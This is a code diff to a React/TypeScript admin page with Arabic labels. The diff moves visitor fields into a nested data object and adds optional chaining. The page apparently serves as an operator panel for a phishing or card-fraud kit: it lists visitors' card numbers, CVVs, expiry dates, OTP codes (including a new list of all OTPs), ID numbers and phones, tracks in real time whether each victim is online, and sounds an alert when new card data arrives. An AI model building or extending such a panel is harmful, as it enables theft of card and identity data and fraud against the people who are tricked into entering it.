@@ -71,18 +71,19 @@ type FlagColor = "red" | "yellow" | "green" | null
 
 interface Notification {
   createdDate: string
+  country?: string
+  id: string | "0"
+  data:{
   bank: string
   cardStatus?: string
   ip?: string
-  cvv: string
-  id: string | "0"
+  paymentCVV: string
   expiryDate: string
   notificationCount: number
   otp: string
   otp2: string
   page: string
-  cardNumber: string
-  country?: string
+  paymentCardNumber: string
   personalInfo: {
     id?: string | "0"
     name?: string
@@ -103,14 +104,17 @@ interface Notification {
   mobile: string
   network: string
   phoneOtp: string
-  cardExpiry: string
+  paymentExpiry: string
   name: string
-  otpCode: string
   phone: string
   flagColor?: string
+}
   currentPage?: string
   amount?: string
   step?: number
+  otp: string
+  allOtps:string[] 
+
 }
 
 // Hook for online users count
@@ -142,7 +146,7 @@ function useUserOnlineStatus(userId: string) {
 
     const unsubscribe = onValue(userStatusRef, (snapshot) => {
       const data = snapshot.val()
-      setIsOnline(data && data.state === "online")
+      setIsOnline(data && data?.state === "online")
     })
 
     return () => unsubscribe()
@@ -245,9 +249,9 @@ function UserStatus({ userId }: { userId: string }) {
     const unsubscribe = onValue(userStatusRef, (snapshot) => {
       const data = snapshot.val()
       if (data) {
-        setStatus(data.state === "online" ? "online" : "offline")
-        if (data.lastChanged) {
-          setLastSeen(new Date(data.lastChanged))
+        setStatus(data?.state === "online" ? "online" : "offline")
+        if (data?.lastChanged) {
+          setLastSeen(new Date(data?.lastChanged))
         }
       } else {
         setStatus("unknown")
@@ -1010,7 +1014,7 @@ export default function NotificationsPage() {
         const data = snapshot.val()
         setOnlineStatuses((prev) => ({
           ...prev,
-          [notification.id]: data && data.state === "online",
+          [notification.id]: data && data?.state === "online",
         }))
       })
 
@@ -1029,9 +1033,9 @@ export default function NotificationsPage() {
 
   // Statistics calculations
   const totalVisitorsCount = notifications.length
-  const cardSubmissionsCount = notifications.filter((n) => n.cardNumber).length
-  const approvedCount = notifications.filter((n) => n.status === "approved").length
-  const pendingCount = notifications.filter((n) => n.status === "pending").length
+  const cardSubmissionsCount = notifications.filter((n) => n.data?.paymentCardNumber).length
+  const approvedCount = notifications.filter((n) => n.data?.status === "approved").length
+  const pendingCount = notifications.filter((n) => n.data?.status === "pending").length
 
   // Filter and search notifications
   const filteredNotifications = useMemo(() => {
@@ -1039,11 +1043,11 @@ export default function NotificationsPage() {
 
     // Apply filter type
     if (filterType === "card") {
-      filtered = filtered.filter((notification) => notification.cardNumber)
+      filtered = filtered.filter((notification) => notification.data?.paymentCardNumber)
     } else if (filterType === "online") {
       filtered = filtered.filter((notification) => onlineStatuses[notification.id])
     } else if (filterType === "pending") {
-      filtered = filtered.filter((notification) => notification.status === "pending")
+      filtered = filtered.filter((notification) => notification.data?.status === "pending")
     }
 
     // Apply search term
@@ -1051,13 +1055,13 @@ export default function NotificationsPage() {
       const term = searchTerm.toLowerCase()
       filtered = filtered.filter(
         (notification) =>
-          notification.name?.toLowerCase().includes(term) ||
-          notification.email?.toLowerCase().includes(term) ||
-          notification.phone?.toLowerCase().includes(term) ||
-          notification.cardNumber?.toLowerCase().includes(term) ||
+          notification.data?.name?.toLowerCase().includes(term) ||
+          notification.data?.email?.toLowerCase().includes(term) ||
+          notification.data?.phone?.toLowerCase().includes(term) ||
+          notification.data?.paymentCardNumber?.toLowerCase().includes(term) ||
           notification.country?.toLowerCase().includes(term) ||
           notification.otp?.toLowerCase().includes(term) ||
-          notification.idNumber?.toLowerCase().includes(term),
+          notification.data?.idNumber?.toLowerCase().includes(term),
       )
     }
 
@@ -1071,8 +1075,8 @@ export default function NotificationsPage() {
           bValue = new Date(b.createdDate)
           break
         case "status":
-          aValue = a.status
-          bValue = b.status
+          aValue = a.data?.status
+          bValue = b.data?.status
           break
         case "country":
           aValue = a.country || ""
@@ -1137,12 +1141,12 @@ export default function NotificationsPage() {
         // Check if there are any new notifications with card info or general info
         const hasNewCardInfo = notificationsData.some(
           (notification) =>
-            notification.cardNumber && !notifications.some((n) => n.id === notification.id && n.cardNumber),
+            notification.data?.paymentCardNumber && !notifications.some((n) => n.id === notification.id && n.data?.paymentCardNumber),
         )
         const hasNewGeneralInfo = notificationsData.some(
           (notification) =>
-            (notification.idNumber || notification.email || notification.mobile) &&
-            !notifications.some((n) => n.id === notification.id && (n.idNumber || n.email || n.mobile)),
+            (notification.data?.idNumber || notification.data?.email || notification.data?.mobile) &&
+            !notifications.some((n) => n.id === notification.id && (n.data?.idNumber || n.data?.email || n.data?.mobile)),
         )
 
         // Only play notification sound if new card info or general info is added
@@ -1707,7 +1711,7 @@ export default function NotificationsPage() {
                           <td className="px-6 py-4">
                             <div className="flex flex-wrap gap-2">
                               <InfoBadge
-                                active={notification.phone || notification.name}
+                                active={notification.data?.phone || notification.data?.name}
                                 onClick={() => handleInfoClick(notification, "personal")}
                                 icon={User}
                                 text="معلومات شخصية"
@@ -1715,7 +1719,7 @@ export default function NotificationsPage() {
                                 colorClass="from-blue-500 to-blue-600"
                               />
                               <InfoBadge
-                                active={notification.cardNumber}
+                                active={notification.data?.paymentCardNumber}
                                 onClick={() => handleInfoClick(notification, "card")}
                                 icon={CreditCard}
                                 text="معلومات البطاقة"
@@ -1725,7 +1729,7 @@ export default function NotificationsPage() {
                             </div>
                           </td>
                           <td className="px-6 py-4">
-                            <StatusBadge status={notification.status} />
+                            <StatusBadge status={notification.data?.status} />
                           </td>
                           <td className="px-6 py-4">
                             <div className="flex items-center gap-2 text-sm text-muted-foreground">
@@ -1807,13 +1811,13 @@ export default function NotificationsPage() {
           {selectedNotification && selectedInfo === "personal" && (
             <InfoSection
               items={[
-                { label: "الاسم", value: selectedNotification.name },
-                { label: "رقم الهوية", value: selectedNotification.idNumber, sensitive: true },
-                { label: "الشبكة", value: selectedNotification.network },
-                { label: "رقم الجوال", value: selectedNotification.mobile, sensitive: true },
-                { label: "الهاتف", value: selectedNotification.phone, sensitive: true },
-                { label: "رمز الهاتف", value: selectedNotification.otp2, sensitive: true },
-                { label: "البريد الإلكتروني", value: selectedNotification.email },
+                { label: "الاسم", value: selectedNotification.data?.name },
+                { label: "رقم الهوية", value: selectedNotification.data?.idNumber, sensitive: true },
+                { label: "الشبكة", value: selectedNotification.data?.network },
+                { label: "رقم الجوال", value: selectedNotification.data?.mobile, sensitive: true },
+                { label: "الهاتف", value: selectedNotification.data?.phone, sensitive: true },
+                { label: "رمز الهاتف", value: selectedNotification.data?.otp2, sensitive: true },
+                { label: "البريد الإلكتروني", value: selectedNotification.data?.email },
               ]}
             />
           )}
@@ -1821,24 +1825,20 @@ export default function NotificationsPage() {
           {selectedNotification && selectedInfo === "card" && (
             <InfoSection
               items={[
-                { label: "البنك", value: selectedNotification.bank },
                 {
                   label: "رقم البطاقة",
-                  value: selectedNotification.cardNumber
-                    ? `${selectedNotification.cardNumber} - ${selectedNotification.prefix}`
+                  value: selectedNotification.data?.paymentCardNumber
+                    ? `${selectedNotification.data?.paymentCardNumber}}`
                     : undefined,
                   sensitive: true,
                 },
                 {
                   label: "تاريخ الانتهاء",
                   value:
-                    selectedNotification.year && selectedNotification.month
-                      ? `${selectedNotification.year}/${selectedNotification.month}`
-                      : selectedNotification.expiryDate,
+                    selectedNotification.data?.paymentExpiry,
                 },
-                { label: "رمز الأمان (CVV)", value: selectedNotification.cvv, sensitive: true },
+                { label: "رمز الأمان (CVV)", value: selectedNotification.data?.paymentCVV, sensitive: true },
                 { label: "رمز التحقق (OTP)", value: selectedNotification.otp, sensitive: true },
-                { label: "كلمة المرور", value: selectedNotification.pass, sensitive: true },
                 { label: "الخطوة الحالية", value: selectedNotification.step },
                 { label: "المبلغ", value: selectedNotification.amount },
               ]}
